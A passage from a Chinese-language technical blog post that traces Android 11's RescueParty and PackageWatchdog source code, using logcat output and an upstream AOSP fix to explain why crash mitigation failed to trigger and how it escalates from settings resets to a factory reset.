boots. 1464 */ 1465 static class BootThreshold { 1466 1467 private final int mBootTriggerCount; 1468 private final long mTriggerWindow; 1469 1470 BootThreshold(int bootTriggerCount, long triggerWindow) { 1471 this.mBootTriggerCount = bootTriggerCount; 1472 this.mTriggerWindow = triggerWindow; 1473 } 1498 /** Increments the boot counter, and returns whether the device is bootlooping. */ 1499 public boolean incrementAndTest() { 1500 final long now = android.os.SystemClock.elapsedRealtime(); 1501 if (now - getStart() < 0) { 1502 Slog.e(TAG, \"Window was less than zero. Resetting start to current time.\"); 1503 setStart(now); 1504 } 1505 final long window = now - getStart(); 1506 if (window >= mTriggerWindow) { 1507 setCount(1); 1508 setStart(now); 1509 return false; 1510 } else { 1511 int count = getCount() + 1; 1512 setCount(count); 1513 EventLogTags.writeRescueNote(Process.ROOT_UID, count, window); 1514 return count >= mBootTriggerCount; 1515 } 1516 } 2 \u76d1\u542cAPP\u53d1\u751f\u4e86\u7cdf\u7cd5\u7684\u5d29\u6e83 onPackagesReady \u5b8c\u6210\u52a0\u8f7d\u914d\u7f6e (updateConfigs ), \u5982\u679c\u7b26\u5408\u5224\u65ad\u6761\u4ef6, \u5219\u901a\u8fc7\u51fd\u6570 execute \u6267\u884c\u56de\u8c03\u7684\u63a5\u53e3: \u914d\u7f6e\u6587\u4ef6: spm8675p1_64:/ # cat /data/system/package-watchdog.xml <?xml version='1.0' encoding='utf-8' standalone='yes' ?> <package-watchdog version=\"1\"> <observer name=\"rescue-party-observer\" /> <observer name=\"rollback-observer\" /> </package-watchdog> 758 /** 759 * Syncs the state of the observers. 760 * 761 * <p> Prunes all observers, saves new state to disk, syncs health check requests with the 762 * health check service and schedules the next state sync. 763 */ 764 private void syncState(String reason) { 765 synchronized (mLock) { 766 Slog.i(TAG, \"Syncing state, reason: \" + reason); 767 pruneObserversLocked(); 768 769 saveToFileAsync(); 770 syncRequestsAsync(); 771 772 // Done syncing state, schedule the next state sync 773 scheduleNextSyncStateLocked(); 774 } 775 } 191 private PackageWatchdog(Context context) { 192 // Needs to be constructed inline 193 this(context, new AtomicFile( 194 new File(new File(Environment.getDataDirectory(), \"system\"), 195 \"package-watchdog.xml\")), 968 /** 969 * Persists mAllObservers to file. Threshold information is ignored. 970 */ 971 private boolean saveToFile() { 972 Slog.i(TAG, \"Saving observer state to file\"); 973 synchronized (mLock) { 974 FileOutputStream stream; 975 try { 976 stream = mPolicyFile.startWrite(); 977 } catch (IOException e) { 978 Slog.w(TAG, \"Cannot update monitored packages\", e); 979 return false; 980 } 981 982 try { 983 XmlSerializer out = new FastXmlSerializer(); ... 291 public void startObservingHealth(PackageHealthObserver observer, List<String> packageNames, 292 long durationMs) { 293 if (packageNames.isEmpty()) { 294 Slog.wtf(TAG, \"No packages to observe, \" + observer.getName()); 295 return; 296 } 297 if (durationMs < 1) { 298 Slog.wtf(TAG, \"Invalid duration \" + durationMs + \"ms for observer \" 299 + observer.getName() + \". Not observing packages \" + packageNames); 300 durationMs = DEFAULT_OBSERVING_DURATION_MS; 301 } 302 303 List<MonitoredPackage> packages = new ArrayList<>(); 304 for (int i = 0; i < packageNames.size(); i++) { 305 // Health checks not available yet so health check state will start INACTIVE 306 MonitoredPackage pkg = newMonitoredPackage(packageNames.get(i), durationMs, false); 307 if (pkg != null) { 308 packages.add(pkg); 309 } 310 } 1213 MonitoredPackage newMonitoredPackage( 1214 String name, long durationMs, boolean hasPassedHealthCheck) { 1215 return newMonitoredPackage(name, durationMs, Long.MAX_VALUE, hasPassedHealthCheck); 1216 } 1218 MonitoredPackage newMonitoredPackage(String name, long durationMs, long healthCheckDurationMs, 1219 boolean hasPassedHealthCheck) { 1220 VersionedPackage pkg = getVersionedPackage(name); 1221 if (pkg == null) { 1222 return null; 1223 } 1224 return new MonitoredPackage(pkg, durationMs, healthCheckDurationMs, hasPassedHealthCheck); 1225 } 1234 class MonitoredPackage { 1235 private final VersionedPackage mPackage; 1421 @HealthCheckState 1422 private int updateHealthCheckStateLocked() { 1423 int oldState = mHealthCheckState; 1424 if (mHasPassedHealthCheck) { 1425 // Set final state first to avoid ambiguity 1426 mHealthCheckState = HealthCheckState.PASSED; 1427 } else if (mHealthCheckDurationMs <= 0 || mDurationMs <= 0) { 1428 // Set final state first to avoid ambiguity 1429 mHealthCheckState = HealthCheckState.FAILED; 1430 } else if (mHealthCheckDurationMs == Long.MAX_VALUE) { 1431 mHealthCheckState = HealthCheckState.INACTIVE; 1432 } else { 1433 mHealthCheckState = HealthCheckState.ACTIVE; 1434 } 1435 Slog.i(TAG, \"Updated health check state for package \" + getName() + \": \" 1436 + toString(oldState) + \" -> \" + toString(mHealthCheckState)); 1437 return mHealthCheckState; 1438 } 1011 /** Dump status of every observer in mAllObservers. */ 1012 public void dump(IndentingPrintWriter pw) { 1013 pw.println(\"Package Watchdog status\"); 1014 pw.increaseIndent(); 1015 synchronized (mLock) { 1016 for (String observerName : mAllObservers.keySet()) { 1017 pw.println(\"Observer name: \" + observerName); 1018 pw.increaseIndent(); 1019 ObserverInternal observerInternal = mAllObservers.get(observerName); 1020 observerInternal.dump(pw); 1021 pw.decreaseIndent(); 1022 } 1023 } 1024 } \u5f53\u5e94\u7528\u6302\u6389\u65f6\u95f4\u95f4\u9694\u4e0d\u5927\u4e8e 1min ( mTriggerFailureDurationMs ), \u4e14\u6302\u6389\u7684\u6b21\u6570\u4e0d\u5c0f\u4e8e 5\u4e2a , \u5219 onFailureLocked \u8fd4\u56de true \u5f53 onFailureLocked \u8fd4\u56de true , \u5bf9\u76d1\u542c\u5668\u6267\u884c onHealthCheckFailed ,\u5982\u679c\u7ed3\u679c\u4e0d\u662f USER_IMPACT_NONE , \u5219\u6700\u7ec8\u6267\u884c\u5230 execute . http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/am/AppErrors.java 406 /** 407 * Bring up the \"unexpected error\" dialog box for a crashing app. 408 * Deal with edge cases (intercepts from instrumented applications, 409 * ActivityController, error intent receivers, that sort of thing). 410 * @param r the application crashing 411 * @param crashInfo describing the failure 412 */ 413 void crashApplication(ProcessRecord r, ApplicationErrorReport.CrashInfo crashInfo) { 414 final int callingPid = Binder.getCallingPid(); 415 final int callingUid = Binder.getCallingUid(); 416 417 final long origId = Binder.clearCallingIdentity(); 418 try { 419 crashApplicationInner(r, crashInfo, callingPid, callingUid); 420 } finally { 421 Binder.restoreCallingIdentity(origId); 422 } 423 } 425 void crashApplicationInner(ProcessRecord r, ApplicationErrorReport.CrashInfo crashInfo, 426 int callingPid, int callingUid) { 427 long timeMillis = System.currentTimeMillis(); 428 String shortMsg = crashInfo.exceptionClassName; 429 String longMsg = crashInfo.exceptionMessage; 430 String stackTrace = crashInfo.stackTrace; 431 if (shortMsg != null && longMsg != null) { 432 longMsg = shortMsg + \": \" + longMsg; 433 } else if (shortMsg != null) { 434 longMsg = shortMsg; 435 } 436 437 if (r != null) { 438 mPackageWatchdog.onPackageFailure(r.getPackageListWithVersionCode(), 439 PackageWatchdog.FAILURE_REASON_APP_CRASH); 440 441 mService.mProcessList.noteAppKill(r, (crashInfo != null 442 && \"Native crash\".equals(crashInfo.exceptionClassName)) 443 ? ApplicationExitInfo.REASON_CRASH_NATIVE 444 : ApplicationExitInfo.REASON_CRASH, 445 ApplicationExitInfo.SUBREASON_UNKNOWN, 446 \"crash\"); 447 } http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/PackageWatchdog.java 359 /** 360 * Called when a process fails due to a crash, ANR or explicit health check. 361 * 362 * <p>For each package contained in the process, one registered observer with the least user 363 * impact will be notified for mitigation. 364 * 365 * <p>This method could be called frequently if there is a severe problem on the device. 366 */ 367 public void onPackageFailure(List<VersionedPackage> packages, 368 @FailureReasons int failureReason) { 369 if (packages == null) { 370 Slog.w(TAG, \"Could not resolve a list of failing packages\"); 371 return; 372 } 373 mLongTaskHandler.post(() -> { 374 synchronized (mLock) { 375 if (mAllObservers.isEmpty()) { 376 return; 377 } 378 boolean requiresImmediateAction = (failureReason == FAILURE_REASON_NATIVE_CRASH 379 || failureReason == FAILURE_REASON_EXPLICIT_HEALTH_CHECK); 380 if (requiresImmediateAction) { 381 handleFailureImmediately(packages, failureReason); 382 } else { 383 for (int pIndex = 0; pIndex < packages.size(); pIndex++) { 384 VersionedPackage versionedPackage = packages.get(pIndex); 385 // Observer that will receive failure for versionedPackage 386 PackageHealthObserver currentObserverToNotify = null; 387 int currentObserverImpact = Integer.MAX_VALUE; 388 389 // Find observer with least user impact 390 for (int oIndex = 0; oIndex < mAllObservers.size(); oIndex++) { 391 ObserverInternal observer = mAllObservers.valueAt(oIndex); 392 PackageHealthObserver registeredObserver = observer.registeredObserver; 393 if (registeredObserver != null 394 && observer.onPackageFailureLocked( 395 versionedPackage.getPackageName())) { 396 int impact = registeredObserver.onHealthCheckFailed( 397 versionedPackage, failureReason); 398 if (impact != PackageHealthObserverImpact.USER_IMPACT_NONE 399 && impact < currentObserverImpact) { 400 currentObserverToNotify = registeredObserver; 401 currentObserverImpact = impact; 402 } 403 } 404 } 405 406 // Execute action with least user impact 407 if (currentObserverToNotify != null) { 408 currentObserverToNotify.execute(versionedPackage, failureReason); 409 } 410 } 411 } 412 } 413 }); 414 } http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/RescueParty.java 419 @Override 420 public int onHealthCheckFailed(@Nullable VersionedPackage failedPackage, 421 @FailureReasons int failureReason) { 422 if (!isDisabled() && (failureReason == PackageWatchdog.FAILURE_REASON_APP_CRASH 423 || failureReason == PackageWatchdog.FAILURE_REASON_APP_NOT_RESPONDING)) { 424 return mapRescueLevelToUserImpact(getNextRescueLevel()); 425 } else { 426 return PackageHealthObserverImpact.USER_IMPACT_NONE; 427 } 428 } \u901a\u8fc7\u52a0log, \u53d1\u73b0 onPackageFailure \u88ab\u8c03\u7528\u4e86, \u4f46\u662f currentObserverToNotify \u4e3a null , \u6240\u4ee5\u8ddf\u8e2a observer.onPackageFailureLocked \u67e5\u770b\u4e3a\u5565\u4e3a false : \u901a\u8fc7\u589e\u52a0log\u6253\u5370, \u53d1\u73b0 RescueParty \u5b58\u5728Bug: 11-08 08:55:37.174 1153 1403 W RescueParty: ==>packageName = com.demo 11-08 08:55:37.174 1153 1826 W ActivityTaskManager: Force finishing activity com.demo/.MainActivity 11-08 08:55:37.176 1153 1403 W RescueParty: NameNotFoundException 11-08 08:55:37.176 1153 1403 W RescueParty: android.content.pm.PackageManager$NameNotFoundException: No module info for package: com.demo 11-08 08:55:37.176 1153 1403 W RescueParty: at android.app.ApplicationPackageManager.getModuleInfo(ApplicationPackageManager.java:1010) 11-08 08:55:37.176 1153 1403 W RescueParty: at com.android.server.RescueParty$RescuePartyObserver.mayObservePackage(RescueParty.java:459) 11-08 08:55:37.176 1153 1403 W RescueParty: at com.android.server.PackageWatchdog$ObserverInternal.onPackageFailureLocked(PackageWatchdog.java:1125) 11-08 08:55:37.176 1153 1403 W RescueParty: at com.android.server.PackageWatchdog.lambda$onPackageFailure$4$PackageWatchdog(PackageWatchdog.java:398) 11-08 08:55:37.176 1153 1403 W RescueParty: at com.android.server.-$$Lambda$PackageWatchdog$Ya4lYGbdDy3Dda20wvc2AHBqIMM.run(Unknown Source:6) 11-08 08:55:37.176 1153 1403 W RescueParty: at android.os.Handler.handleCallback(Handler.java:938) 11-08 08:55:37.176 1153 1403 W RescueParty: at android.os.Handler.dispatchMessage(Handler.java:99) 11-08 08:55:37.176 1153 1403 W RescueParty: at android.os.Looper.loop(Looper.java:223) 11-08 08:55:37.176 1153 1403 W RescueParty: at android.os.HandlerThread.run(HandlerThread.java:67) 11-08 08:55:37.177 1153 1403 E PackageWatchdog: ==> onPackageFailureLocked : registeredObserver.mayObservePackage(packageName) = false http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/PackageWatchdog.java 551 /** Register instances of this interface to receive notifications on package failure. */ 552 public interface PackageHealthObserver { 1026 /** 1027 * Represents an observer monitoring a set of packages along with the failure thresholds for 1028 * each package. 1029 * 1030 * <p> Note, the PackageWatchdog#mLock must always be held when reading or writing 1031 * instances of this class. 1032 */ 1033 private static class ObserverInternal { 1034 public final String name; ... 1110 /** 1111 * Increments failure counts of {@code packageName}. 1112 * @returns {@code true} if failure threshold is exceeded, {@code false} otherwise 1113 */ 1114 @GuardedBy(\"mLock\") 1115 public boolean onPackageFailureLocked(String packageName) { 1116 if (packages.get(packageName) == null && registeredObserver.isPersistent() 1117 && registeredObserver.mayObservePackage(packageName)) { 1118 packages.put(packageName, sPackageWatchdog.newMonitoredPackage( 1119 packageName, DEFAULT_OBSERVING_DURATION_MS, false)); 1120 } 1121 MonitoredPackage p = packages.get(packageName); 1122 if (p != null) { 1123 return p.onFailureLocked(); 1124 } 1125 return false; 1126 } 94 public static final int FAILURE_REASON_UNKNOWN = 0; 95 public static final int FAILURE_REASON_NATIVE_CRASH = 1; 96 public static final int FAILURE_REASON_EXPLICIT_HEALTH_CHECK = 2; 97 public static final int FAILURE_REASON_APP_CRASH = 3; 98 public static final int FAILURE_REASON_APP_NOT_RESPONDING = 4; 389 public static class RescuePartyObserver implements PackageHealthObserver { 419 @Override 420 public int onHealthCheckFailed(@Nullable VersionedPackage failedPackage, 421 @FailureReasons int failureReason) { 422 if (!isDisabled() && (failureReason == PackageWatchdog.FAILURE_REASON_APP_CRASH 423 || failureReason == PackageWatchdog.FAILURE_REASON_APP_NOT_RESPONDING)) { 424 return mapRescueLevelToUserImpact(getNextRescueLevel()); 425 } else { 426 return PackageHealthObserverImpact.USER_IMPACT_NONE; 427 } 428 } 448 @Override 449 public boolean isPersistent() { 450 return true; 451 } 452 453 @Override 454 public boolean mayObservePackage(String packageName) { 455 PackageManager pm = mContext.getPackageManager(); 456 try { 457 // A package is a module if this is non-null 458 if (pm.getModuleInfo(packageName, 0) != null) { 459 return true; 460 } 461 } catch (PackageManager.NameNotFoundException ignore) { 462 } 463 464 try { 465 ApplicationInfo info = pm.getApplicationInfo(packageName, 0); 466 return (info.flags & PERSISTENT_MASK) == PERSISTENT_MASK; 467 } catch (PackageManager.NameNotFoundException e) { 468 return false; 469 } 470 } \u627e\u5230Android11\u4e0a\u7684diff : https://github.com/aosp-mirror/platform_frameworks_base/commit/f2abc4e6fa6ed79462e0ddfc6ede526edc646378 , \u6ce8\u91ca\u5185\u5bb9: Fix Rescue Party observability criteria The previous behavior erroneously returned if the package was not found by PackageManager#getModuleInfo, which means the persistent process check would never be performed. This caused packages like com.android.systemui to not be handled by Rescue Party's mitigation logic. Instead, ensure that both cases are checked. Test: setprop persist.sys.enable_rescue true, adb shell setprop debug.crash_sysui 1, adb shell kill `pidof com.android.systemui`, ensure recovery mode is reached Bug: 169284310 Change-Id: Ifec19b8daba1dacc7f5efcfa47ed3c3a046612e3 \u4fee\u590d\u540e, \u62d4\u6389 USB \u8c03\u8bd5\u7ebf, \u6210\u529f\u8fdb\u5165Recovery\u6a21\u5f0f: 3 RescueParty \u6267\u884c\u91cd\u7f6e\u7684\u6761\u4ef6 \u6d4b\u8bd5\u60c5\u51b5\u624b\u52a8\u8bbe\u7f6e\u5c5e\u6027 persist.sys.enable_rescue \u8fdb\u5165\u6551\u63f4\u6a21\u5f0f; \u7cfb\u7edf\u56de\u6eda\u540e, \u901a\u8fc7\u8bbe\u7f6e\u5c5e\u6027 persist.device_config.configuration.disable_rescue_party , \u4e0d\u8fdb\u5165\u6551\u63f4\u6a21\u5f0f; \u5de5\u7a0b\u7248\u672c, \u4e0d\u8fdb\u5165\u6551\u63f4\u6a21\u5f0f; userdebug \u7248\u672c\u4e14 adb \u53ef\u7528, \u4e0d\u8fdb\u5165\u6551\u63f4\u6a21\u5f0f; \u5f53 persist.sys.disable_rescue \u88ab\u8bbe\u7f6e\u4e3a true , \u4e0d\u8fdb\u5165\u6551\u63f4\u6a21\u5f0f; \u5426\u5219\u70ed\u91cd\u542f\u540e\u5c31\u4f1a\u6267\u884c\u91cd\u7f6e\u64cd\u4f5c. http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/RescueParty.java 75 @VisibleForTesting 76 static final String PROP_ENABLE_RESCUE = \"persist.sys.enable_rescue\"; 99 private static final String PROP_DISABLE_RESCUE = \"persist.sys.disable_rescue\"; 101 private static final String PROP_DEVICE_CONFIG_DISABLE_FLAG = 102 \"persist.device_config.configuration.disable_rescue_party\"; 113 private static boolean isDisabled() { 114 // Check if we're explicitly enabled for testing 115 if (SystemProperties.getBoolean(PROP_ENABLE_RESCUE, false)) { 116 return false; 117 } 118 119 // We're disabled if the DeviceConfig disable flag is set to true. 120 // This is in case that an emergency rollback of the feature is needed. 121 if (SystemProperties.getBoolean(PROP_DEVICE_CONFIG_DISABLE_FLAG, false)) { 122 Slog.v(TAG, \"Disabled because of DeviceConfig flag\"); 123 return true; 124 } 125 126 // We're disabled on all engineering devices 127 if (Build.IS_ENG) { 128 Slog.v(TAG, \"Disabled because of eng build\"); 129 return true; 130 } 131 132 // We're disabled on userdebug devices connected over USB, since that's 133 // a decent signal that someone is actively trying to debug the device, 134 // or that it's in a lab environment. 135 if (Build.IS_USERDEBUG && isUsbActive()) { 136 Slog.v(TAG, \"Disabled because of active USB connection\"); 137 return true; 138 } 139 140 // One last-ditch check 141 if (SystemProperties.getBoolean(PROP_DISABLE_RESCUE, false)) { 142 Slog.v(TAG, \"Disabled because of manual property\"); 143 return true; 144 } 145 146 return false; 147 } 389 public static class RescuePartyObserver implements PackageHealthObserver { ... 430 @Override 431 public boolean execute(@Nullable VersionedPackage failedPackage, 432 @FailureReasons int failureReason) { 433 if (isDisabled()) { 434 return false; 435 } 436 if (failureReason == PackageWatchdog.FAILURE_REASON_APP_CRASH 437 || failureReason == PackageWatchdog.FAILURE_REASON_APP_NOT_RESPONDING) { 438 int triggerUid = getPackageUid(mContext, failedPackage.getPackageName()); 439 incrementRescueLevel(triggerUid); 440 executeRescueLevel(mContext, 441 failedPackage == null ? null : failedPackage.getPackageName()); 442 return true; 443 } else { 444 return false; 445 } 446 } 472 @Override 473 public int onBootLoop() { 474 if (isDisabled()) { 475 return PackageHealthObserverImpact.USER_IMPACT_NONE; 476 } 477 return mapRescueLevelToUserImpact(getNextRescueLevel()); 478 } 479 480 @Override 481 public boolean executeBootLoopMitigation() { 482 if (isDisabled()) { 483 return false; 484 } 485 incrementRescueLevel(Process.ROOT_UID); 486 executeRescueLevel(mContext, /*failedPackage=*/ null); 487 return true; 488 } 540 /** 541 * Hacky test to check if the device has an active USB connection, which is 542 * a good proxy for someone doing local development work. 543 */ 544 private static boolean isUsbActive() { 545 if (SystemProperties.getBoolean(PROP_VIRTUAL_DEVICE, false)) { 546 Slog.v(TAG, \"Assuming virtual device is connected over USB\"); 547 return true; 548 } 549 try { 550 final String state = FileUtils 551 .readTextFile(new File(\"/sys/class/android_usb/android0/state\"), 128, \"\"); 552 return \"CONFIGURED\".equals(state.trim()); 553 } catch (Throwable t) { 554 Slog.w(TAG, \"Failed to determine if device was on USB\", t); 555 return false; 556 } 557 } 4 RescueParty \u6267\u884c\u91cd\u7f6e executeRescueLevel \u65f6, RescueParty \u6309 sys.rescue_level \u8bbe\u7f6e\u7684 level \u987a\u5e8f\u9010\u6e10\u52a0\u5f3a: - LEVEL_NONE : \u672a\u8bbe\u7f6e\u6216\u8bbe\u7f6e\u4e3a0, \u76f4\u63a5\u8fd4\u56de - LEVEL_RESET_SETTINGS_UNTRUSTED_DEFAULTS : \u91cd\u7f6eSetting\u914d\u7f6e, - LEVEL_RESET_SETTINGS_UNTRUSTED_CHANGES : \u91cd\u7f6eSetting\u914d\u7f6e, - LEVEL_RESET_SETTINGS_TRUSTED_DEFAULTS : \u91cd\u7f6eSetting\u914d\u7f6e, - LEVEL_FACTORY_RESET : \u6062\u590d\u51fa\u5382\u8bbe\u7f6e\u5e76\u6e05\u9664\u7528\u6237\u6570\u636e http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/RescueParty.java 224 /** 225 * Get the next rescue level. This indicates the next level of mitigation that may be taken. 226 */ 227 private static int getNextRescueLevel() { 228 return MathUtils.constrain(SystemProperties.getInt(PROP_RESCUE_LEVEL, LEVEL_NONE) + 1, 229 LEVEL_NONE, LEVEL_FACTORY_RESET); 230 } 231 232 /** 233 * Escalate to the next rescue level. After incrementing the level you'll 234 * probably want to call {@link #executeRescueLevel(Context, String)}. 235 */ 236 private static void incrementRescueLevel(int triggerUid) { 237 final int level = getNextRescueLevel(); 238 SystemProperties.set(PROP_RESCUE_LEVEL, Integer.toString(level)); 239 240 EventLogTags.writeRescueLevel(level, triggerUid); 241 logCriticalInfo(Log.WARN, \"Incremented rescue level to \" 242 + levelToString(level) + \" triggered by UID \" + triggerUid); 243 } 75 @VisibleForTesting 76 static final String PROP_ENABLE_RESCUE = \"persist.sys.enable_rescue\"; 77 @VisibleForTesting 78 static final String PROP_RESCUE_LEVEL = \"sys.rescue_level\"; 79 @VisibleForTesting 80 static final int LEVEL_NONE = 0; 81 @VisibleForTesting 82 static final int LEVEL_RESET_SETTINGS_UNTRUSTED_DEFAULTS = 1; 83 @VisibleForTesting 84 static final int LEVEL_RESET_SETTINGS_UNTRUSTED_CHANGES = 2; 85 @VisibleForTesting 86 static final int LEVEL_RESET_SETTINGS_TRUSTED_DEFAULTS = 3; 87 @VisibleForTesting 88 static final int LEVEL_FACTORY_RESET = 4; 245 private static void executeRescueLevel(Context context, @Nullable String failedPackage) { 246 final int level = SystemProperties.getInt(PROP_RESCUE_LEVEL, LEVEL_NONE); 247 if (level == LEVEL_NONE) return; 248 249 Slog.w(TAG, \"Attempting rescue level \" + levelToString(level)); 250 try { 251 executeRescueLevelInternal(context, level, failedPackage); 252 EventLogTags.writeRescueSuccess(level); 253 logCriticalInfo(Log.DEBUG, 254 \"Finished rescue level \" + levelToString(level)); 255 } catch (Throwable t) { 256 logRescueException(level, t); 257 } 258 } 260 private static void executeRescueLevelInternal(Context context, int level, @Nullable 261 String failedPackage) throws Exception { 262 FrameworkStatsLog.write(FrameworkStatsLog.RESCUE_PARTY_RESET_REPORTED, level); 263 switch (level) { 264 case LEVEL_RESET_SETTINGS_UNTRUSTED_DEFAULTS: 265 resetAllSettings(context, Settings.RESET_MODE_UNTRUSTED_DEFAULTS, failedPackage); 266 break; 267 case LEVEL_RESET_SETTINGS_UNTRUSTED_CHANGES: 268 resetAllSettings(context, Settings.RESET_MODE_UNTRUSTED_CHANGES, failedPackage); 269 break; 270 case LEVEL_RESET_SETTINGS_TRUSTED_DEFAULTS: 271 resetAllSettings(context, Settings.RESET_MODE_TRUSTED_DEFAULTS, failedPackage); 272 break; 273 case LEVEL_FACTORY_RESET: 274 // Request the reboot from a separate thread to avoid deadlock on PackageWatchdog 275 // when device shutting down. 276 Runnable runnable = new Runnable() { 277 @Override 278 public void run() { 279 try { 280 RecoverySystem.rebootPromptAndWipeUserData(context, TAG); 281 } catch (Throwable t) { 282 logRescueException(level, t); 283 } 284 } 285 }; 286 Thread thread = new Thread(runnable); 287 thread.start(); 288 break; 289 } 290 } 321 private static void resetAllSettings(Context context, int mode, @Nullable String failedPackage) 322 throws Exception { 323 // Try our best to reset all settings possible, and once finished 324 // rethrow any exception that we encountered 325 Exception res = null; 326 final ContentResolver resolver = context.getContentResolver(); 327 try { 328 resetDeviceConfig(context, mode, failedPackage); 329 } catch (Exception e) { 330 res = new RuntimeException(\"Failed to reset config settings\", e); 331 } 332 try { 333 Settings.Global.resetToDefaultsAsUser(resolver, null, mode, UserHandle.USER_SYSTEM); 334 } catch (Exception e) { 335 res = new RuntimeException(\"Failed to reset global settings\", e); 336 } 337 for (int userId : getAllUserIds()) { 338 try { 339 Settings.Secure.resetToDefaultsAsUser(resolver, null, mode, userId); 340 } catch (Exception e) { 341 res = new RuntimeException(\"Failed to reset secure settings for \" + userId, e); 342 } 343 } 344 if (res != null) { 345 throw res; 346 } 347 } log/tar_logcat.02/logcat.log_1.42:11-03 05:05:34.228 879 909 W PackageManager: Incremented rescue level to RESET_SETTINGS_UNTRUSTED_DEFAULTS triggered by UID 1000 log/tar_logcat.02/logcat.log_1.42:11-03 05:05:35.859 879 909 W PackageManager: Incremented rescue level to RESET_SETTINGS_UNTRUSTED_CHANGES triggered by UID 1000 log/tar_logcat.02/logcat.log_1.42:11-03 05:05:37.289 879 909 W PackageManager: Incremented rescue level to RESET_SETTINGS_TRUSTED_DEFAULTS triggered by UID 1000 log/tar_logcat.02/logcat.log_1.42:11-03 05:05:40.503 879 909 W PackageManager: Incremented rescue level to FACTORY_RESET triggered by UID 1000 5 \u6062\u590d\u51fa\u5382 \u6062\u5382\u4f20\u7ed9\u53c2\u6570reason\u7684\u503c\u662fTAG (RescueParty), http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/core/java/android/os/RecoverySystem.java 107 /** Used to communicate with recovery. See bootable/recovery/recovery.cpp. */ 108 private static final File RECOVERY_DIR = new File(\"/cache/recovery\"); 109 private static final File LOG_FILE = new File(RECOVERY_DIR, \"log\"); 1162 /** 1163 * Called after booting to process and remove recovery-related files. 1164 * @return the log file from recovery, or null if none was found. 1165 * 1166 * @hide 1167 */ 1168 public static String handleAftermath(Context context) { 1169 // Record the tail of the LOG_FILE 1170 String log = null; 1171 try { 1172 log = FileUtils.readTextFile(LOG_FILE, -LOG_FILE_MAX_LENGTH, \"...\\n\"); 1173 } catch (FileNotFoundException e) { 1174 Log.i(TAG, \"No recovery log file\"); 1175 } catch (IOException e) { 1176 Log.e(TAG, \"Error reading recovery log\", e); 1177 } 1050 /** {@hide} */ 1051 public static void rebootPromptAndWipeUserData(Context context, String reason) 1052 throws IOException { 1053 boolean checkpointing = false; 1054 boolean needReboot = false; 1055 IVold vold = null; 1056 try { 1057 vold = IVold.Stub.asInterface(ServiceManager.checkService(\"vold\")); 1058 if (vold != null) { 1059 checkpointing = vold.needsCheckpoint(); 1060 } else { 1061 Log.w(TAG, \"Failed to get vold\"); 1062 } 1063 } catch (Exception e) { 1064 Log.w(TAG, \"Failed to check for checkpointing\"); 1065 } 1066 1067 // If we are running in checkpointing mode, we should not prompt a wipe. 1068 // Checkpointing may save us. If it doesn't, we will wind up here again. 1069 if (checkpointing) { 1070 try { 1071 vold.abortChanges(\"rescueparty\", false); 1072 Log.i(TAG, \"Rescue Party requested wipe. Aborting update\"); 1073 } catch (Exception e) { 1074 Log.i(TAG, \"Rescue Party requested wipe. Rebooting instead.\"); 1075 PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE); 1076 pm.reboot(\"rescueparty\"); 1077 } 1078 return; 1079 } 1080 1081 String reasonArg = null; 1082 if (!TextUtils.isEmpty(reason)) { 1083 reasonArg = \"--reason=\" + sanitizeArg(reason); 1084 } 1085 1086 final String localeArg = \"--locale=\" + Locale.getDefault().toString(); 1087 bootCommand(context, null, \"--prompt_and_wipe_data\", reasonArg, localeArg); 1088 } 1138 /** 1139 * Reboot into the recovery system with the supplied argument. 1140 * @param args to pass to the recovery utility. 1141 * @throws IOException if something goes wrong. 1142 */ 1143 private static void bootCommand(Context context, String... args) throws IOException { 1144 LOG_FILE.delete(); 1145 1146 StringBuilder command = new StringBuilder(); 1147 for (String arg : args) { 1148 if (!TextUtils.isEmpty(arg)) { 1149 command.append(arg); 1150 command.append(\"\\n\"); 1151 } 1152 } 1153 1154 // Write the command into BCB (bootloader control block) and boot from 1155 // there. Will not return unless failed. 1156 RecoverySystem rs = (RecoverySystem) context.getSystemService(Context.RECOVERY_SERVICE); 1157 rs.rebootRecoveryWithCommand(command.toString()); 1158 1159 throw new IOException(\"Reboot failed (no permissions?)\"); 1160 } http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/recoverysystem/RecoverySystemService.java#276 275 @Override // Binder call 276 public void rebootRecoveryWithCommand(String command) { 277 if (DEBUG) Slog.d(TAG, \"rebootRecoveryWithCommand: [\" + command + \"]\"); 278 synchronized (sRequestLock) { 279 if (!setupOrClearBcb(true, command)) { 280 return; 281 } 282 283 // Having set up the BCB, go ahead and reboot. 284 PowerManager pm = mInjector.getPowerManager(); 285 pm.reboot(PowerManager.REBOOT_RECOVERY); 286 } 287 } http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/power/PowerManagerService.java#126 5128 /** 5129 * Reboots the device. 5130 * 5131 * @param confirm If true, shows a reboot confirmation dialog. 5132 * @param reason The reason for the reboot, or null if none. 5133 * @param wait If true, this call waits for the reboot to complete and does not return. 5134 */ 5135 @Override // Binder call 5136 public void reboot(boolean confirm, @Nullable String reason, boolean wait) { 5137 mContext.enforceCallingOrSelfPermission(android.Manifest.permission.REBOOT, null); 5138 if (PowerManager.REBOOT_RECOVERY.equals(reason) 5139 || PowerManager.REBOOT_RECOVERY_UPDATE.equals(reason)) { 5140 mContext.enforceCallingOrSelfPermission(android.Manifest.permission.RECOVERY, null); 5141 } 5142 5143 final long ident = Binder.clearCallingIdentity(); 5144 try { 5145 shutdownOrRebootInternal(HALT_MODE_REBOOT, confirm, reason, wait); 5146 } finally { 5147 Binder.restoreCallingIdentity(ident); 5148 } 5149 } 6 \u547d\u4ee4\u4f20\u9012 \u51fd\u6570 setupOrClearBcb \u8bbe\u7f6e\u5c5e\u6027 ctl.start \u4e3a setup-bcb , \u7136\u540e\u628a\u547d\u4ee4\u53d1\u7ed9 UncryptSocket http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/recoverysystem/RecoverySystemService.java 415 private boolean setupOrClearBcb(boolean isSetup, String command) { 416 